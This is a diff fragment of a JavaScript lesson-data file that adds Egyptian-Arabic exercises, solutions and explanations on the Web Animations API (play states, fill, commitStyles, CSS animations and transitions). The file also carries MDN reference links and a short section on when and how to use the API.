+- **[[shake?.cancel()]]:** من غيرها الضغطتين بيعملوا animationين على نفس الخاصية، والأحدث بيغطي، بس الاتنين فاضلين في [[getAnimations()]] لحد ما يخلصوا.
+- **[[role="alert"]]:** قارئ الشاشة بيقول الرسالة. الاهتزاز لوحده مش بيوصل للي مش شايف.
+- **[[if (calm.matches) return]]:** الرسالة واللون كفاية، والاهتزاز زينة.` },
+            { lvl: 'تطبيق', t: R`**ابني:** عربية بتمشي على خط في ٣ ثواني ([[linear]]، [[fill: "both"]])، وتحتها زراير: شغّل، وقّف، اعكس، أسرع ×٢، للآخر، ألغي. وسطر بيكتب [[playState]] و [[currentTime]] و [[playbackRate]] (من قسم ٢ في الشرح).`, done: R`كل زرار بيغيّر السطر صح: [[pause]] = paused، و [[reverse]] = سرعة بالسالب، و [[finish]] = finished، و [[cancel]] = idle و [[currentTime]] = null، و «شغّل» بعد «ألغي» بتبدأ من جديد.`, sol: R`~~~live 230 عربية بتتحكم فيها
+<style>
+  body { font: 15px/1.6 system-ui, sans-serif; margin: 16px; }
+  .track { position: relative; height: 56px; border-bottom: 2px dashed #ccc; margin-block: 12px; max-width: 300px; }
+  #car { position: absolute; inset-inline-start: 0; top: 4px; font-size: 32px; line-height: 1; }
+  button { font: inherit; margin: 2px; }
+  output { font-family: monospace; }
+</style>
+<div class="track"><span id="car" aria-hidden="true">🚗</span></div>
+<p id="controls">
+  <button type="button" data-do="play">شغّل</button>
+  <button type="button" data-do="pause">وقّف</button>
+  <button type="button" data-do="reverse">اعكس</button>
+  <button type="button" data-do="fast">أسرع ×2</button>
+  <button type="button" data-do="finish">للآخر</button>
+  <button type="button" data-do="cancel">ألغي</button>
+</p>
+<p>الحالة: <output id="state"></output></p>
+<script>
+const car = document.querySelector("#car");
+const anim = car.animate(
+  [{ transform: "translateX(0)" }, { transform: "translateX(-260px)" }],
+  { duration: 3000, easing: "linear", fill: "both" }
+);
+anim.pause();
+const state = document.querySelector("#state");
+function show() {
+  const t = anim.currentTime === null ? "null" : Math.round(anim.currentTime) + "ms";
+  state.textContent = anim.playState + " | " + t + " | سرعة " + anim.playbackRate;
+}
+const actions = {
+  play: () => anim.play(),
+  pause: () => anim.pause(),
+  reverse: () => anim.reverse(),
+  fast: () => anim.updatePlaybackRate(anim.playbackRate * 2),
+  finish: () => anim.finish(),
+  cancel: () => anim.cancel(),
+};
+document.querySelector("#controls").addEventListener("click", e => {
+  const b = e.target.closest("[data-do]");
+  if (!b) return;
+  actions[b.dataset.do]();
+  show();
+});
+setInterval(show, 250);
+show();
+</script>
+~~~
+
+~~~text الناتج (Chrome 157، Playwright داس بالترتيب)
+البداية: paused | 0ms | سرعة 1
+شغّل:    running | 0ms | سرعة 1
+وقّف:    paused | 17ms | سرعة 1
+أسرع:    paused | 33ms | سرعة 2
+اعكس:    running | 33ms | سرعة 2
+للآخر:   finished | 0ms | سرعة -2
+ألغي:    idle | null | سرعة -2
+شغّل:    running | 3000ms | سرعة -2
+~~~
+
+- **[[anim.pause()]] على طول بعد [[animate]]:** الحركة بتبدأ لوحدها، فبنوقفها عشان اليوزر يبدأ.
+- **«اعكس» بعد «أسرع»:** السرعة بقت [[-2]] (نفس السرعة والاتجاه بالعكس)، و «للآخر» وداها لصفر لأن الآخر في الاتجاه ده هو البداية.
+- **«شغّل» بعد «ألغي» بدأت من ٣٠٠٠ms:** السرعة لسه بالسالب، فالبداية هي آخر الحركة.
+- **[[updatePlaybackRate]]** بدل [[playbackRate =]] وهي شغالة: بتغيّر السرعة من غير ما العربية تقفز.
+- **الأرقام الصغيرة (17 و 33):** الوقت اللي عدّى بين الضغطات في Playwright. على جهازك هتختلف.
+- **[[setInterval(show, 250)]]** عشان السطر يتحدث وهي ماشية. الأحسن [[requestAnimationFrame]] لو هتعرض حاجة بتتحرك مع الـ animation.` },
+            { lvl: 'سريع', t: R`**اقرا وتوقّع:** [[const x = box.animate({ opacity: [1, 0] }, 1000)]]. إيه [[x.playState]] على طول؟ وبعد [[x.pause()]]؟ وبعد [[x.finish()]]؟ وبعد [[x.cancel()]]؟ و [[x.finished]] بعد [[cancel]] بتعمل إيه؟ (من قسم ٢ في الشرح).`, done: R`[["running"]] ثم [["paused"]] ثم [["finished"]] ثم [["idle"]]، و [[finished]] اترفضت بـ [[AbortError]] بعد الـ [[cancel]].`, sol: R`~~~js states.js (module في صفحة فيها #box)
+const box = document.querySelector("#box");
+const x = box.animate({ opacity: [1, 0] }, 1000);
+const states = [x.playState];
+x.pause(); states.push(x.playState);
+x.finish(); states.push(x.playState);
+await x.finished;
+const y = box.animate({ opacity: [1, 0] }, 1000);
+y.finished.catch(e => console.log("finished اترفضت:", e.name));
+y.cancel(); states.push(y.playState, String(y.currentTime));
+console.log(states.join(" → "));
+~~~
+
+~~~text الناتج (Chrome 157)
+running → paused → finished → idle → null
+finished اترفضت: AbortError
+~~~
+
+- **[[finished]] بتاعة [[x]] اتحلّت** بعد [[finish()]]، فالـ [[await]] عدّى على طول.
+- **بعد [[finished]] الـ Promise مبتتغيرش:** لو عايز تستنى تاني بعد [[play()]] من جديد، [[anim.finished]] بترجّع Promise جديدة.
+- **[[cancel()]]** = [["idle"]] و [[currentTime]] = [[null]]، والتأثير اتشال كأن الـ animation محصلتش.` },
+            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** [[box.animate({ transform: ["none", "scale(1.5)"] }, 300)]]. الصندوق بيكبر وبعدين **بيرجع** صغير. صلّحه بطريقتين: بـ [[fill]]، وبـ [[commitStyles()]] و [[cancel()]]، واطبع [[box.style.transform]] و [[box.getAnimations().length]] في الاتنين (من قسم ٣ في الشرح).`, done: R`الطريقة الأولى: [[style.transform]] فاضي و animation واحدة فاضلة. التانية: [[style.transform]] = [["scale(1.5)"]] و صفر animations.`, sol: R`~~~js keep-end.js (module في صفحة فيها #box)
+const box = document.querySelector("#box");
+const a = box.animate({ transform: ["none", "scale(1.5)"] }, { duration: 100, fill: "forwards" });
+await a.finished;
+console.log("fill:", JSON.stringify(box.style.transform), box.getAnimations().length, getComputedStyle(box).transform);
+a.cancel();
+const b = box.animate({ transform: ["none", "scale(1.5)"] }, { duration: 100, fill: "forwards" });
+await b.finished;
+b.commitStyles();
+b.cancel();
+console.log("commitStyles:", box.style.transform, box.getAnimations().length);
+~~~
+
+~~~text الناتج (Chrome 157)
+fill: "" 1 matrix(1.5, 0, 0, 1.5, 0, 0)
+commitStyles: scale(1.5) 0
+~~~
+
+- **من غير [[fill]]** الـ animation بتخلص وتتشال، والعنصر بيرجع لقيمة الـ CSS بتاعته ([[none]]).
+- **[[fill: "forwards"]]:** شكله صح ([[matrix(1.5...)]] في الـ computed)، بس [[style.transform]] فاضي والـ animation لسه ماسكة الخاصية. لو كتبت [[box.style.transform = "none"]] بعدين مش هيحصل حاجة.
+- **[[commitStyles()]]:** كتب القيمة الحالية في [[style]]، و [[cancel()]] شالت الـ animation. ده الأنضف لما الحالة الجديدة هي الحالة الدايمة.` },
+            { lvl: 'تطبيق', t: R`**قارن:** صفحة فيها عنصر عليه CSS [[animation: spin 2s linear infinite]] وعنصر تاني عليه [[transition: opacity 1s]]. غيّر [[opacity]] التاني، واطبع [[document.getAnimations()]] بنوع كل واحدة واسمها، ووقّف الـ spin من JS، واستنى الـ transition تخلص بـ [[finished]] (من قسم ٤ في الشرح).`, done: R`اتطبع [[CSSTransition:opacity, CSSAnimation:spin]]، والـ spin بقى [["paused"]]، والـ [[await]] على الـ transition خلص من غير [[setTimeout]].`, sol: R`~~~html css-and-waapi.html
+<style>
+  .box { width: 60px; height: 60px; background: #0a7; border-radius: 8px; }
+  .spin { animation: spin 2s linear infinite; }
+  @keyframes spin { to { rotate: 1turn; } }
+  .fade { transition: opacity 1s; }
+</style>
+<div class="box spin" id="b"></div>
+<div class="box fade" id="c"></div>
+<script type="module">
+const c = document.querySelector("#c");
+getComputedStyle(c).opacity;
+c.style.opacity = 0;
+console.log(document.getAnimations().map(a => a.constructor.name + ":" + (a.animationName || a.transitionProperty || a.id)).join(", "));
+const spin = document.querySelector("#b").getAnimations()[0];
+console.log(spin.playState);
+spin.pause();
+console.log(spin.playState);
+await Promise.all(c.getAnimations().map(a => a.finished));
+console.log("الـ transition خلصت، opacity =", getComputedStyle(c).opacity);
+</script>
+~~~
+
+~~~text الناتج (Chrome 157)
+CSSTransition:opacity, CSSAnimation:spin
+running
+paused
+الـ transition خلصت، opacity = 0
+~~~
+
+- **[[animationName]]** على [[CSSAnimation]] و **[[transitionProperty]]** على [[CSSTransition]]: الاتنين نوع من [[Animation]] فعليهم [[pause]] و [[finished]] وكله.
+- **[[getComputedStyle(c).opacity]] قبل التغيير مش زيادة:** أول تشغيل كان من غيره، والناتج كان [[CSSAnimation:spin]] بس، و [[await]] خلص على طول. السكربت شغال والعنصر لسه متحسبلوش style أصلًا، فالمتصفح مشافش «قيمة قديمة» يعمل منها transition: العنصر اترسم على طول بـ [[opacity: 0]]. قراية أي قيمة محسوبة بتجبر المتصفح يحسب الـ style الأول، فالتغيير بعدها بقى transition. (نفس الفخ لما تضيف عنصر وتحط عليه class في نفس السطر: درس «transition و @keyframes».)
+- **الترتيب:** الـ transitions قبل الـ CSS animations في [[getAnimations()]]، وبعدهم اللي اتعملوا بـ [[animate()]].
+- **[[Promise.all(...finished)]]** هي الطريقة الصح تستنى CSS transition. [[transitionend]] event كمان شغال، بس مبيجيش لو الـ transition اتلغت.` },
+          ],
+          ref: [
+            { t: "MDN: Web Animations API", url: "https://developer.mozilla.org/en-US/docs/Web/API/Web_Animations_API" },
+            { t: "MDN: Using the Web Animations API", url: "https://developer.mozilla.org/en-US/docs/Web/API/Web_Animations_API/Using_the_Web_Animations_API" },
+            { t: "MDN: Element.animate()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/animate" },
+            { t: "MDN: Animation", url: "https://developer.mozilla.org/en-US/docs/Web/API/Animation" },
+            { t: "MDN: Animation.finished", url: "https://developer.mozilla.org/en-US/docs/Web/API/Animation/finished" },
+            { t: "MDN: Animation.commitStyles()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Animation/commitStyles" },
+            { t: "MDN: Document.getAnimations()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Document/getAnimations" },
+            { t: "MDN: prefers-reduced-motion", url: "https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/At-rules/@media/prefers-reduced-motion" },
+          ],
+          pre: [{ to: "css/transition و @keyframes", why: R`نفس الـ keyframes والـ easing والـ fill بس في CSS` }, { to: "css/تكبير الخط و prefers-reduced-motion", why: R`النسخة الهادية من كل حركة في CSS` }, "js/async و await"],
+          deep: {
+            why: R`أي واجهة حديثة فيها حركة مش ثابتة: إشعارات بتدخل وتخرج، وعناصر بتتنقل، وزرار بيتهز. من غير WAAPI بتكتب [[setTimeout]] بنفس مدة الـ CSS، وبتضيف وتشيل classes، وبتحسب بإيدك. WAAPI بيديك object وPromise، ونفس أداء CSS.`,
+            how: R`كل [[animate()]] بيعمل [[KeyframeEffect]] (الـ keyframes والـ timing والعنصر) و [[Animation]] (التشغيل) مربوطة بـ [[document.timeline]]. المتصفح في كل frame بيحسب القيمة من [[currentTime]] والـ easing ويحطها فوق الـ style (مش جواه). ولو الخصايص [[transform]] و [[opacity]] بس، الحساب بيحصل على الـ compositor thread، فالحركة بتفضل ناعمة حتى لو الـ main thread مشغول.`,
+            when: R`WAAPI لحركة محسوبة، أو محتاجة تحكم، أو محتاج تستنى نهايتها، أو لعناصر اتعملت من JS. CSS لحالات ثابتة (hover، focus، class). مكتبة (Motion أو GSAP) لحركات معقدة متسلسلة كتير، أو spring physics، أو scroll-linked animations في متصفحات قديمة.`,
+            mistakes: R`[[setTimeout]] بنفس المدة بدل [[finished]]. نسيان [[fill]] والعنصر يرجع. [[fill: "forwards"]] على كل حاجة والـ animations تتراكم. [[finished]] من غير [[catch]] مع [[cancel()]]. [[duration]] بالثواني ([[0.3]]). تحريك [[left]] و [[width]]. تجاهل [[prefers-reduced-motion]]. حركتين على نفس الخاصية من غير [[cancel]] للقديمة.`,
+          },
         },
       ]
     }
